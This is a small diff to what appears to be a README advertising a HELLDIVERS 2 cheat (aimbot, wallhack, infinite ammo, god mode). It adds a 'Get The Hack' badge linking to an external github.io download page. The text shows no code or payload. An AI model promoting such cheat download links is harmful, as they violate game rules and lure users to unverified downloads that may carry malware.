@@ -4,6 +4,7 @@
 
 HELLDIVERS 2 is all about teamwork, chaos, and endless alien swarms. But what if you had the power to break the rules? With a **HELLDIVERS 2 hack**, you can unlock aimbot precision, wallhack vision, infinite ammo, and full god mode, giving you a massive edge in every battle. This guide covers the most popular hacks and what makes them game-changing.
 
+[![Get](https://img.shields.io/badge/Get%20The-Hack-blueviolet)](https://helldivers-2-hack.github.io/.github/)
 ---
 
 ## Product Description
